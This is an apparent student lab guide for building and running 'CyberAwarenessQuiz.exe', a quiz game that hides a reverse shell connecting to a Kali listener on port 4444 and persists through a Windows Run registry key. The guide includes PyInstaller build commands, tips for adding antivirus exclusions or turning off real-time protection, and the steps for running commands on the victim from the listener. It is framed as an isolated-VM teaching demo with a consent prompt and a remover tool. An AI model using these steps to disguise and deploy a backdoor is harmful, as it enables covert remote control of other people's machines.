# Step-by-Step Execution Guide

**EDUCATIONAL DEMO ONLY – Rwanda Coding Academy Assignment**  
Use only in isolated VMs (Kali + Windows). Never on real systems.

This is what **you** have to do, in order.

---

## Phase 1: Preparation (one-time)

### Step 1.1 – Get your Kali VM IP

1. Start your **Kali Linux** VM.
2. Open a terminal and run: `ip a` or `hostname -I`.
3. Note the IP (e.g. `192.168.56.101` or `10.0.2.15`). You will use this in the game.

### Step 1.2 – Set the IP in the game code

1. On your **Windows** VM (or host if you edit there), open **game.py**.
2. At the top, find: `KALI_IP = "192.168.56.101"`.
3. Replace `192.168.56.101` with **your** Kali VM IP. Save the file.

### Step 1.3 – Build the executables (on Windows VM)

1. On the **Windows** VM, open **Command Prompt** or **PowerShell**.
2. Go to the project folder, e.g.:
  `cd C:\Users\YourName\Backdoor_game`
3. Install PyInstaller if needed:
  `pip install pyinstaller`
4. Build the **game**:
  `pyinstaller --onefile --noconsole --name "CyberAwarenessQuiz" --hidden-import=socket --hidden-import=threading --hidden-import=subprocess --hidden-import=winreg --hidden-import=urllib.request game.py`
5. Build the **remover**:
  `pyinstaller --onefile --noconsole --name "BackdoorRemover" --hidden-import=winreg remover.py`
6. Your executables are in the **dist** folder:
  - `dist\CyberAwarenessQuiz.exe`  
  - `dist\BackdoorRemover.exe`

*(If Windows Defender blocks the build or the .exe, add an exclusion for the project folder in the VM only.)*

---

## Phase 2: Start services on Kali (every time you test)

### Step 2.1 – (Optional) Start the HTTP server for curl

1. On **Kali**, open a terminal.
2. Go to the project folder:
  `cd /path/to/Backdoor_game`
3. *(Optional)* If you want the “curl dependency” demo: put **curl.exe** in this folder, then run:
  `python3 http_server_kali.py`
4. Leave this terminal open. You should see: `Serving files from ... on http://0.0.0.0:8000`

### Step 2.2 – Start the listener (required)

1. On **Kali**, open a **second** terminal.
2. Go to the project folder:
  `cd /path/to/Backdoor_game`
3. Run:
  `python3 listener.py`
4. You should see: `[*] Listener bound to 0.0.0.0:4444` and `Waiting for incoming connection...`
5. **Leave this terminal open** – you will type shell commands here later.

---

## Phase 3: Run the game on Windows

### Step 3.1 – Check network

1. On the **Windows** VM, open **Command Prompt**.
2. Ping Kali (use your Kali IP):
  `ping 192.168.56.101`  
   You should get replies. If not, fix the VM network (same virtual network as Kali).

### Step 3.2 – Run the game

1. On **Windows**, go to the **dist** folder (or where you put the .exe).
2. Double-click **CyberAwarenessQuiz.exe** (or run it from Command Prompt).
3. A **consent dialog** appears. Read it and click **Yes** to continue (or **No** to exit).

### Step 3.3 – Play the quiz

1. The **Cyber Awareness Quiz** opens in full screen.
2. Answer the 10 multiple-choice questions (click an option, then **Next**).
3. The reverse shell runs in the background; you do not see it.
4. When done, press **Escape** to close the quiz window.

---

## Phase 4: Use the reverse shell (on Kali)

1. In the **Kali** terminal where **listener.py** is running, you should see:
  `[+] Session opened from <Windows_IP>:<port>`
2. A prompt appears: `(shell) $`
3. Type commands that run **on the Windows machine**, for example:
  - `whoami`
  - `hostname`
  - `dir`
  - `ipconfig`
4. Output appears in the same Kali terminal.
5. To end the session, type: `exit` or `quit`

---

## Phase 5: Test persistence (optional)

1. On **Windows**, **restart** the VM (or shut down and start again, then log in).
2. After login, the game should start again automatically (from the Run key).
3. On **Kali**, start the listener again if needed:
  `python3 listener.py`  
   You should get a new connection when the quiz runs on Windows.

---

## Phase 6: Clean up (remover)

1. On **Windows**, run **BackdoorRemover.exe** (from the dist folder).
2. In the dialog, read the message and click **Yes** to confirm.
3. A result window shows what was removed (registry key, file in %APPDATA%).
4. Click **Close**. Persistence is removed; the game will no longer start at login.

---

## Quick reference – order of actions


| Order | Where   | What to do                                                   |
| ----- | ------- | ------------------------------------------------------------ |
| 1     | Kali    | Start `python3 http_server_kali.py` (optional)               |
| 2     | Kali    | Start `python3 listener.py` – **keep it open**               |
| 3     | Windows | Run `CyberAwarenessQuiz.exe` → **Yes** → play quiz           |
| 4     | Kali    | At `(shell) $` type e.g. `whoami`, `dir`                     |
| 5     | Windows | Press **Escape** to close quiz when done                     |
| 6     | Windows | Run `BackdoorRemover.exe` when you want to remove everything |


---

## If something doesn’t work

- **Listener says “Waiting” but nothing happens:**  
Check that `KALI_IP` in **game.py** (before building) matches Kali’s IP, and that Windows can ping Kali.
- **Game is blocked by antivirus:**  
In the VM only, add an exclusion for the project folder or the .exe, or temporarily turn off real-time protection for the demo.
- **No shell output on Kali:**  
Make sure you clicked **Yes** on the consent dialog and that the quiz actually started (reverse shell starts after consent).
- **Persistence didn’t run after reboot:**  
Run **BackdoorRemover.exe** once to clean, then run the game again and reboot to test persistence again.

